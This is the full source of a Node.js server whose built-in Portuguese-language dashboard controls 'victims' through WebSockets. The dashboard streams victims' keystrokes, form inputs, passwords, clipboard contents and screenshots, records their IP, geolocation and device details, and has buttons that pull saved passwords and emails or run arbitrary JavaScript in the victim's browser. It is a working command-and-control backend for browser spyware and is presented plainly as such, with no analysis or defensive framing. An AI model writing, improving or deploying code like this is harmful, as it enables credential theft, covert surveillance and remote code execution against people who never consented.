const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const sessions = {};
const victimConnections = {};
const adminClients = new Set();
const imageChunks = {}; // sess -> { cmd: { total, chunks, title, url } }

app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="pt-br">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Æ Painel de Controle</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0b0d1a; color:#e0e5ff; font-family:'Segoe UI', system-ui, sans-serif; display:flex; height:100vh; overflow:hidden; }
.sidebar { width:260px; background:#13162b; border-right:1px solid #2a2f55; display:flex; flex-direction:column; padding:16px; flex-shrink:0; overflow-y:auto; }
.sidebar h1 { font-size:20px; font-weight:700; background:linear-gradient(135deg,#00f0ff,#7b2ffc); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:8px; }
.sidebar .status { font-size:12px; color:#7b8ab8; margin-bottom:16px; display:flex; align-items:center; gap:8px; }
.sidebar .status .dot { width:8px; height:8px; background:#00ff88; border-radius:50%; animation:pulse 1.5s infinite; }
@keyframes pulse { 0%{opacity:1} 50%{opacity:0.3} }
.sidebar .counter { background:#1c2142; padding:10px 14px; border-radius:10px; margin-bottom:14px; border-left:3px solid #00f0ff; }
.sidebar .counter span { font-size:24px; font-weight:700; color:#fff; }
.sidebar .counter small { color:#8892c0; font-size:12px; display:block; }
#victim-list { flex:1; overflow-y:auto; list-style:none; margin-top:4px; }
#victim-list li { padding:8px 12px; margin-bottom:4px; background:#181d3a; border-radius:8px; cursor:pointer; transition:0.2s; border-left:2px solid transparent; font-size:12px; display:flex; justify-content:space-between; align-items:center; }
#victim-list li:hover { background:#222a52; }
#victim-list li.active { border-left-color:#00f0ff; background:#1f264a; }
#victim-list li .badge { background:#2a3366; padding:2px 8px; border-radius:20px; font-size:10px; color:#aab4e0; }
.main { flex:1; display:flex; flex-direction:column; padding:16px 20px; background:#0b0d1a; overflow:hidden; }
.main-header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px; }
.main-header h2 { font-weight:400; font-size:16px; color:#bcc6f0; }
.main-header h2 strong { color:#fff; font-weight:600; }
.main-header .actions { display:flex; gap:6px; align-items:center; flex-wrap:wrap; }
.main-header .actions button { background:#1a1f3d; border:none; color:#aab4e0; padding:5px 12px; border-radius:20px; font-size:11px; cursor:pointer; transition:0.2s; font-weight:500; }
.main-header .actions button:hover { background:#2a2f55; color:#fff; }
.main-header .actions .cmd-btn { background:#1a2a4a; color:#6dd5ed; border:1px solid #2a4a6a; }
.main-header .actions .cmd-btn:hover { background:#2a4a6a; }
.main-header .actions .danger-btn { background:#3d1a2a; color:#ff7b9c; }
.main-header .actions .danger-btn:hover { background:#5a1f3a; }
.main-header .actions .cmd-input { background:#0e1124; border:1px solid #1e2346; color:#d0d9ff; padding:4px 10px; border-radius:16px; font-size:11px; width:180px; font-family:monospace; }
.main-header .actions .cmd-input:focus { outline:none; border-color:#00f0ff; }
.device-info { background:#0e1124; border-radius:10px; padding:8px 14px; margin-bottom:10px; border:1px solid #1e2346; font-size:11px; color:#8892c0; display:flex; flex-wrap:wrap; gap:6px 16px; max-height:80px; overflow-y:auto; }
.device-info .item { display:flex; gap:4px; white-space:nowrap; }
.device-info .item .label { color:#4a5580; }
.device-info .item .value { color:#d0d9ff; font-weight:500; }
.tabs { display:flex; gap:4px; margin-bottom:8px; border-bottom:1px solid #1e2346; padding-bottom:6px; }
.tabs button { background:transparent; border:none; color:#4a5580; padding:4px 14px; border-radius:12px; font-size:11px; cursor:pointer; transition:0.2s; }
.tabs button:hover { color:#aab4e0; background:#1a1f3d; }
.tabs button.active { color:#fff; background:#1a1f3d; }
#log-container { flex:1; background:#0e1124; border-radius:12px; border:1px solid #1e2346; padding:10px 14px; overflow-y:auto; font-family:'JetBrains Mono', monospace; font-size:11px; line-height:1.4; }
.log-entry { padding:2px 0; border-bottom:1px solid #171d38; display:flex; gap:8px; animation:fadeIn 0.15s ease; align-items:flex-start; }
@keyframes fadeIn { from{opacity:0;transform:translateY(-2px)} to{opacity:1} }
.log-entry .time { color:#4a5580; white-space:nowrap; min-width:50px; font-size:10px; }
.log-entry .type-tag { background:#2a2f55; padding:0 8px; border-radius:10px; font-size:8px; text-transform:uppercase; color:#aab4e0; letter-spacing:0.3px; white-space:nowrap; }
.log-entry .content { color:#d0d9ff; word-break:break-all; flex:1; font-size:11px; }
.log-entry .content img.screenshot-thumb { max-width:180px; max-height:120px; border-radius:4px; border:1px solid #2a2f55; cursor:pointer; margin-top:2px; transition:0.2s; }
.log-entry .content img.screenshot-thumb:hover { transform:scale(1.02); border-color:#00f0ff; }
.log-entry .content .json-block { background:#0b0d1a; padding:3px 6px; border-radius:4px; font-size:10px; white-space:pre-wrap; word-break:break-all; max-height:80px; overflow-y:auto; border:1px solid #1e2346; font-family:monospace; }
.highlight-input { color:#ffd966; }
.highlight-click { color:#ff7b9c; }
.highlight-key { color:#6dd5ed; }
.highlight-clip { color:#b38bff; }
.highlight-handshake { color:#8be07a; }
.highlight-cmd { color:#ffaa44; }
::-webkit-scrollbar { width:4px; }
::-webkit-scrollbar-track { background:#0b0d1a; }
::-webkit-scrollbar-thumb { background:#2a2f55; border-radius:10px; }
.empty-state { color:#3d4670; text-align:center; padding:30px 0; font-size:13px; }
.lightbox { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:9999; }
.lightbox.active { display:flex; }
.lightbox img { max-width:90%; max-height:90%; border-radius:10px; border:2px solid #2a2f55; }
.lightbox .close-lb { position:absolute; top:16px; right:24px; font-size:32px; color:#fff; cursor:pointer; }
</style></head>
<body>
<div class="lightbox" id="lightbox" onclick="this.classList.remove('active')"><span class="close-lb">&times;</span><img id="lb-img" src=""></div>
<div class="sidebar"><h1>Æ CONTROL</h1><div class="status"><span class="dot"></span> Sistema ativo</div><div class="counter"><span id="total-count">0</span><small>Vítimas conectadas</small></div><ul id="victim-list"></ul><div style="margin-top:10px;font-size:9px;color:#2f3a66;text-align:center;">made by imrudra77</div></div>
<div class="main">
  <div class="main-header">
    <h2>📡 Monitorando: <strong id="selected-id">Nenhuma</strong></h2>
    <div class="actions">
      <span class="info-badge" id="event-counter">0 eventos</span>
      <button class="cmd-btn" id="cmd-screenshot">📸 Print Agora</button>
      <button class="cmd-btn" id="cmd-passwords">🔑 Senhas</button>
      <button class="cmd-btn" id="cmd-emails">📧 Emails</button>
      <button class="cmd-btn" id="cmd-allinputs">📋 Todos Inputs</button>
      <input type="text" class="cmd-input" id="cmd-js-input" placeholder="código JS...">
      <button class="cmd-btn" id="cmd-execute">▶ Executar JS</button>
      <button class="danger-btn" id="clear-logs">🗑️ Limpar</button>
    </div>
  </div>
  <div id="device-info" class="device-info" style="display:none;"></div>
  <div class="tabs">
    <button class="active" data-filter="all">Todos</button>
    <button data-filter="handshake">Conexões</button>
    <button data-filter="input">Inputs</button>
    <button data-filter="key">Teclas</button>
    <button data-filter="screenshot">Prints</button>
    <button data-filter="cmd_result">Comandos</button>
    <button data-filter="password">Senhas</button>
  </div>
  <div id="log-container"><div class="empty-state">Aguardando conexões...</div></div>
</div>
<script>
const WS_URL = \`wss://\${window.location.host}\`;
let ws, allData = {}, selectedId = null, currentFilter = 'all';
function connect() {
  ws = new WebSocket(WS_URL);
  ws.onopen = () => { ws.send(JSON.stringify({type:'admin'})); console.log('[+] Conectado'); };
  ws.onmessage = (e) => {
    const msg = JSON.parse(e.data);
    if (msg.type === 'update') {
      if (!allData[msg.sess]) allData[msg.sess] = [];
      allData[msg.sess].push(msg);
      renderSidebar();
      if (selectedId === msg.sess) renderLogs(selectedId);
    } else if (msg.type === 'init') {
      allData = msg.data || {};
      renderSidebar();
      const keys = Object.keys(allData);
      if (keys.length) selectVictim(keys[0]);
    }
  };
  ws.onclose = () => setTimeout(connect, 2000);
}
function sendCommand(cmd, extra) {
  if (!selectedId) { alert('Selecione uma vítima primeiro!'); return; }
  const payload = { type: 'command', cmd, target: selectedId };
  if (extra) Object.assign(payload, extra);
  ws.send(JSON.stringify(payload));
  if (!allData[selectedId]) allData[selectedId] = [];
  allData[selectedId].push({ type: 'cmd_sent', cmd, _t: Date.now() });
  renderLogs(selectedId);
}
document.getElementById('cmd-screenshot').addEventListener('click', () => sendCommand('screenshot'));
document.getElementById('cmd-passwords').addEventListener('click', () => sendCommand('get_passwords'));
document.getElementById('cmd-emails').addEventListener('click', () => sendCommand('get_emails'));
document.getElementById('cmd-allinputs').addEventListener('click', () => sendCommand('get_all_inputs'));
document.getElementById('cmd-execute').addEventListener('click', () => {
  const code = document.getElementById('cmd-js-input').value.trim();
  if (!code) { alert('Digite um código JS'); return; }
  sendCommand('execute_js', { code });
  document.getElementById('cmd-js-input').value = '';
});
document.getElementById('cmd-js-input').addEventListener('keydown', (e) => {
  if (e.key === 'Enter') document.getElementById('cmd-execute').click();
});
function renderSidebar() {
  const ids = Object.keys(allData);
  document.getElementById('total-count').textContent = ids.length;
  const list = document.getElementById('victim-list');
  list.innerHTML = '';
  ids.forEach(id => {
    const li = document.createElement('li');
    li.className = (selectedId === id) ? 'active' : '';
    li.innerHTML = \`\${id.slice(0,8)}... <span class="badge">\${allData[id].length}</span>\`;
    li.onclick = () => selectVictim(id);
    list.appendChild(li);
  });
}
function selectVictim(id) {
  selectedId = id;
  document.getElementById('selected-id').textContent = id;
  renderSidebar();
  renderDeviceInfo(id);
  renderLogs(id);
}
function renderDeviceInfo(id) {
  const logs = allData[id] || [];
  const h = logs.find(l => l.type === 'handshake');
  const div = document.getElementById('device-info');
  if (h && h.device) {
    const d = h.device;
    const accessTime = h._t ? new Date(h._t).toLocaleString('pt-BR') : 'desconhecido';
    const ip = h.ip || 'desconhecido';
    const geo = h.geo || 'Desconhecido';
    div.style.display = 'flex';
    div.innerHTML = \`
      <span class="item"><span class="label">Marca/Modelo:</span> <span class="value">\${d.brand || '?'} \${d.deviceModel || '?'}</span></span>
      <span class="item"><span class="label">Sistema:</span> <span class="value">\${d.os || '?'} \${d.osVersion || ''}</span></span>
      <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen?.w || '?'}x\${d.screen?.h || '?'}</span></span>
      <span class="item"><span class="label">RAM:</span> <span class="value">\${d.hardware?.memory || '?'} GB</span></span>
      <span class="item"><span class="label">Rede:</span> <span class="value">\${d.network?.type || '?'}</span></span>
      <span class="item"><span class="label">IP:</span> <span class="value">\${ip}</span></span>
      <span class="item"><span class="label">Localização:</span> <span class="value">\${geo}</span></span>
      <span class="item"><span class="label">Acesso:</span> <span class="value">\${accessTime}</span></span>
    \`;
  } else { div.style.display = 'none'; }
}
function renderLogs(id) {
  const container = document.getElementById('log-container');
  let logs = allData[id] || [];
  const filter = currentFilter;
  if (filter !== 'all') {
    logs = logs.filter(l => {
      if (filter === 'password') return l.type === 'cmd_result' && l.cmd === 'passwords';
      if (filter === 'screenshot') return l.type === 'cmd_result' && l.cmd === 'screenshot' || l.type === 'screenshot_auto';
      return l.type === filter;
    });
  }
  document.getElementById('event-counter').textContent = logs.length + ' eventos';
  if (!logs.length) { container.innerHTML = '<div class="empty-state">Nenhum dado com este filtro</div>'; return; }
  let html = '';
  logs.forEach(log => {
    const time = log._t ? new Date(log._t).toLocaleTimeString('pt-BR') : (log.timestamp ? new Date(log.timestamp).toLocaleTimeString('pt-BR') : '—');
    const type = log.type || 'unknown';
    let content = '', cls = '';
    switch(type) {
      case 'handshake': content = \`🔗 Nova conexão: \${log.url || ''}\`; cls = 'highlight-handshake'; break;
      case 'input': content = \`⌨️ [\${log.name || 'campo'}] = "\${(log.value || '').slice(0,80)}"\`; if (log.isPassword) content += ' 🔒 SENHA'; cls = 'highlight-input'; break;
      case 'blur': content = \`📤 Sair de [\${log.name}] = "\${(log.value || '').slice(0,80)}"\`; if (log.isPassword) content += ' 🔒 SENHA'; break;
      case 'focus': content = \`📥 Foco em [\${log.name}]\`; break;
      case 'change': content = \`🔄 Change [\${log.name}] = \${log.value || ''}\`; break;
      case 'key': content = \`⌨️ Tecla: "\${log.key}" \${log.ctrl ? '(Ctrl)' : ''}\${log.shift ? '(Shift)' : ''}\`; cls = 'highlight-key'; break;
      case 'click': content = \`🖱️ Clique (\${log.x},\${log.y}) em \${log.target || '?'}\`; cls = 'highlight-click'; break;
      case 'copy': case 'cut': case 'paste': content = \`📋 \${type.toUpperCase()}: "\${(log.content || '').slice(0,80)}"\`; cls = 'highlight-clip'; break;
      case 'selection': content = \`📝 Seleção: "\${(log.text || '').slice(0,80)}"\`; break;
      case 'form_submit': content = \`📨 Formulário enviado para \${log.action || ''}\n\` + JSON.stringify(log.fields, null, 2); break;
      case 'link': content = \`🔗 Link: \${log.href || ''}\`; break;
      case 'screenshot_auto':
        if (log.image && log.image.startsWith('data:image')) {
          content = \`📸 Auto-print \${log.title || ''} <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
        } else { content = '📸 Auto-print indisponível'; }
        break;
      case 'cmd_sent': content = \`📤 Comando enviado: \${log.cmd}\`; cls = 'highlight-cmd'; break;
      case 'cmd_result':
        if (log.cmd === 'screenshot') {
          if (log.image && log.image.startsWith('data:image')) {
            content = \`📸 Print sob demanda <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
          } else { content = '📸 Print falhou'; }
        } else if (log.cmd === 'passwords') {
          content = \`🔑 \${log.count || 0} senha(s) encontradas:\n\` + JSON.stringify(log.data || [], null, 2);
          cls = 'highlight-clip';
        } else if (log.cmd === 'emails') {
          content = \`📧 \${log.count || 0} email(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
          cls = 'highlight-clip';
        } else if (log.cmd === 'get_all_inputs') {
          content = \`📋 \${log.count || 0} campo(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
        } else if (log.cmd === 'execute_js') {
          content = log.success ? \`✅ JS executado: \${log.result || 'sem retorno'}\` : \`❌ Erro: \${log.error || 'desconhecido'}\`;
          cls = log.success ? 'highlight-handshake' : 'highlight-click';
        } else if (log.cmd === 'ack') {
          content = \`✅ Comando "\${log.command}" recebido pela vítima\`;
          cls = 'highlight-handshake';
        } else if (log.cmd === 'message_received') {
          content = \`📨 Mensagem "\${log.original}" recebida pela vítima\`;
          cls = 'highlight-cmd';
        } else {
          content = JSON.stringify(log, null, 2);
        }
        break;
      default: content = JSON.stringify(log, null, 2);
    }
    if (content.length > 500) content = content.slice(0, 500) + '...';
    html += \`<div class="log-entry"><span class="time">\${time}</span><span class="type-tag">\${type}</span><span class="content \${cls}">\${content}</span></div>\`;
  });
  container.innerHTML = html;
  container.scrollTop = container.scrollHeight;
}
document.querySelectorAll('.tabs button').forEach(btn => {
  btn.addEventListener('click', function() {
    document.querySelectorAll('.tabs button').forEach(b => b.classList.remove('active'));
    this.classList.add('active');
    currentFilter = this.dataset.filter;
    if (selectedId) renderLogs(selectedId);
  });
});
document.getElementById('clear-logs').addEventListener('click', function() {
  if (!selectedId || !confirm('Limpar logs de ' + selectedId + '?')) return;
  allData[selectedId] = [];
  renderSidebar();
  renderLogs(selectedId);
  ws.send(JSON.stringify({ type: 'clear', sess: selectedId }));
});
connect();
</script></body></html>`);
});

// ---------- WEBSOCKET ----------
wss.on('connection', async (ws) => {
  ws.isAdmin = false;
  const ip = (ws._socket.remoteAddress || 'desconhecido').replace('::ffff:', '');
  let geo = 'Desconhecido';
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`);
    const data = await response.json();
    if (data && data.city) geo = `${data.city}, ${data.region}, ${data.country_name}`;
  } catch(e) {}

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      if (data.type === 'admin') {
        ws.isAdmin = true;
        adminClients.add(ws);
        ws.send(JSON.stringify({ type: 'init', data: sessions }));
        return;
      }
      if (data.type === 'clear' && data.sess) {
        if (sessions[data.sess]) sessions[data.sess] = [];
        adminClients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'update', sess: data.sess, type: 'clear_ack', _t: Date.now() }));
          }
        });
        return;
      }
      if (data.type === 'command' && data.target) {
        const targetWs = victimConnections[data.target];
        if (targetWs && targetWs.readyState === WebSocket.OPEN) {
          const cmdPayload = { type: 'command', cmd: data.cmd };
          if (data.code) cmdPayload.code = data.code;
          targetWs.send(JSON.stringify(cmdPayload));
          adminClients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_sent', cmd: data.cmd, _t: Date.now() }));
            }
          });
        } else {
          adminClients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: 'update', sess: data.target, type: 'cmd_error', error: 'Vítima offline', _t: Date.now() }));
            }
          });
        }
        return;
      }
      // Trata chunks de imagem
      if (data.type === 'image_chunk' && data.sess) {
        const key = data.cmd;
        if (!imageChunks[data.sess]) imageChunks[data.sess] = {};
        if (!imageChunks[data.sess][key]) {
          imageChunks[data.sess][key] = { total: data.total, chunks: [], title: data.title, url: data.url };
        }
        imageChunks[data.sess][key].chunks[data.index] = data.data;
        // Verifica se todos os chunks chegaram
        const chunkData = imageChunks[data.sess][key];
        if (chunkData.chunks.filter(c => c !== undefined).length === data.total) {
          const fullBase64 = chunkData.chunks.join('');
          const imageData = 'data:image/jpeg;base64,' + fullBase64;
          const result = {
            type: 'cmd_result',
            cmd: data.cmd,
            image: imageData,
            title: chunkData.title,
            url: chunkData.url,
            sess: data.sess,
            _t: Date.now()
          };
          // Envia para todos os admins
          adminClients.forEach(client => {
            if (client.readyState === WebSocket.OPEN) {
              client.send(JSON.stringify({ type: 'update', ...result }));
            }
          });
          // Salva nos logs da sessão
          if (!sessions[data.sess]) sessions[data.sess] = [];
          sessions[data.sess].push(result);
          // Limpa chunks
          delete imageChunks[data.sess][key];
        }
        return;
      }
      // Dados normais da vítima
      if (data.sess) {
        if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
          victimConnections[data.sess] = ws;
          ws.on('close', () => {
            if (victimConnections[data.sess] === ws) delete victimConnections[data.sess];
          });
        }
        if (!sessions[data.sess]) sessions[data.sess] = [];
        if (data.type === 'handshake') { data.ip = ip; data.geo = geo; }
        console.log(`[${data.sess}] Tipo: ${data.type}, Cmd: ${data.cmd || 'N/A'}`);
        sessions[data.sess].push(data);
        adminClients.forEach(client => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ type: 'update', sess: data.sess, ...data }));
          }
        });
      }
    } catch(e) { /* erro de parsing */ }
  });

  ws.on('close', () => {
    if (ws.isAdmin) adminClients.delete(ws);
    for (let sess in victimConnections) {
      if (victimConnections[sess] === ws) delete victimConnections[sess];
    }
  });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, () => console.log(`Æ Painel rodando na porta ${PORT}`));
